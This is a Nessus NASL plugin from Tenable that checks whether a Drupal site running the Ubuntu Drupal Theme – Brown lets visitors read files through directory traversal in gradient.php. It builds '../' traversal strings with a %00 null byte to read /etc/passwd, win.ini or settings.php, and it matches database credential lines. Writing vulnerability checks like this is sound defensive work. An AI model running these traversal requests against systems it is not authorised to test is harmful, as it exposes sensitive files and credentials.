#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(50302);
  script_version("$Revision: 1.13 $");
  script_cvs_date("$Date: 2015/10/13 15:19:33 $");

  script_bugtraq_id(44281);
  script_osvdb_id(68772);

  script_name(english:"Ubuntu Drupal Theme - Brown images/layout/gradient.php File Disclosure");
  script_summary(english:"Attempts to read a local file.");

  script_set_attribute(
    attribute:"synopsis",
    value:
"The remote web server hosts a PHP script that is affected by a
directory traversal vulnerability."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The version of the Ubuntu Drupal Theme - Brown installed on the
Drupal install on the remote host does not properly sanitize
user-supplied input to the 'start' and 'end' parameters of the
'images/layout/gradient.php' script before using it to return the
contents of a file.

A remote, unauthenticated attacker can exploit this issue to disclose
the contents of sensitive files on the affected system subject to the
privileges under which the web server operates."
  );
  script_set_attribute(attribute:"see_also", value:"http://drupal.org/cvs?commit=439212");
  script_set_attribute(attribute:"see_also", value:"http://drupal.org/node/947632");
  script_set_attribute(
    attribute:"solution",
    value:
"Either remove the affected file or upgrade to Ubuntu Drupal Theme -
Brown 6.x-8.1 or later."
  );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2010/10/20");
  script_set_attribute(attribute:"patch_publication_date", value:"2010/10/20");
  script_set_attribute(attribute:"plugin_publication_date", value:"2010/10/22");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:drupal:drupal");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2010-2015 Tenable Network Security, Inc.");

  script_dependencies("drupal_detect.nasl", "os_fingerprint.nasl");
  script_require_keys("installed_sw/Drupal", "www/PHP");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("install_func.inc");

app = "Drupal";
ext = 'Ubuntu Drupal Theme';
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
install_url = build_url(qs:dir, port:port);

# Determine where to look for the affected file.
res = http_send_recv3(method:"GET", item:dir+'/', port:port, exit_on_fail:TRUE);

base_urls = make_list();

# - maybe it's the default theme.
if ("/themes/udtheme" >< res[2])
{
  pat = '(' + dir + '[^"]+/themes/udtheme[^"/]*)/(css|favicon\\.ico|logo)';
  matches = egrep(pattern:pat, string:res[2]);
  if (matches)
  {
    foreach match (split(matches, keep:FALSE))
    {
      item = eregmatch(pattern:pat, string:match);
      if (!isnull(item))
      {
        base_urls = make_list(item[1]);
        break;
      }
    }
  }
}
if (
  !thorough_tests &&
  max_index(base_urls) == 0
) exit(0, "The "+app+" install at "+install_url+" does not use the "+ext+" as its default theme and the 'Perform thorough tests' setting are not enabled.");

# - hardcode some paths
if (thorough_tests)
{
  base_urls = make_list(
    base_urls,
    dir+'/sites/all/themes/udtheme',
    dir+'/themes/udtheme'
  );
  base_urls = list_uniq(base_urls);
}

# Determine what to look for.
os = get_kb_item("Host/OS");
if (os && report_paranoia < 2)
{
  if ("Windows" >< os) files = make_list('/windows/win.ini', '/winnt/win.ini');
  else files = make_list('/etc/passwd');
}
else files = make_list('/etc/passwd', '/windows/win.ini', '/winnt/win.ini', 'default/settings.php');

file_pats = make_array();
file_pats['/etc/passwd'] = "root:.*:0:[01]:";
file_pats['/winnt/win.ini'] = "^\[[a-zA-Z]+\]|^; for 16-bit app support";
file_pats['/windows/win.ini'] = "^\[[a-zA-Z]+\]|^; for 16-bit app support";
file_pats['default/settings.php'] = '^\\$db_(url|prefix)[ \t]*=[ \t]*[^ \t]*;';

# And go.
udtheme_installs = 0;

foreach base_url (base_urls)
{
  foreach file (files)
  {
    # Try to exploit the issue.
    if (file[0] == '/')
    {
      if ("win.ini" >< file) traversal = crap(data:"..\", length:3*15) + '..';
      else                    traversal = crap(data:"../", length:3*15) + '..';
    }
    else traversal = crap(data:"../", length:3*5);

    url = base_url + '/images/layout/gradient.php?' +
      'start=' + traversal + file + '%00';

    res = http_send_recv3(method:"GET", item:url, port:port, exit_on_fail:TRUE);

    headers = parse_http_headers(status_line:res[0], headers:res[1]);
    if (isnull(headers)) audit(AUDIT_WEB_NO_SERVER_HEADER, port);

    if (headers['content-type'] && 'image/png' >< headers['content-type'])
    {
      udtheme_installs++;
    }
    # otherwise continue unless we're being paranoid.
    else if (report_paranoia < 2)
    {
      continue;
    }

    # There's a problem if we see the expected contents.
    body = res[2];
    file_pat = file_pats[file];

    if (egrep(pattern:file_pat, string:body))
    {
      if (os && "Windows" >< os) file = str_replace(find:'/', replace:'\\', string:file);
      rep_extra =
       'Note that some browsers will try to render the response from the URL\n'+
       'above as an image and display an error rather than the file contents.\n'
       + 'If this happens, try an alternate browser or send the request\n' +
       'manually.\n';

      security_report_v4(
        port        : port,
        severity    : SECURITY_WARNING,
        file        : file,
        rep_extra   : rep_extra,
        request     : make_list(build_url(qs:url, port:port)),
        output      : chomp(res),
        attach_type : 'text/plain'
      );
      exit(0);
    }
  }
}
if (udtheme_installs) audit(AUDIT_WEB_APP_EXT_NOT_AFFECTED, app, install_url, ext);
else audit(AUDIT_WEB_APP_EXT_NOT_INST, app, install_url, ext);
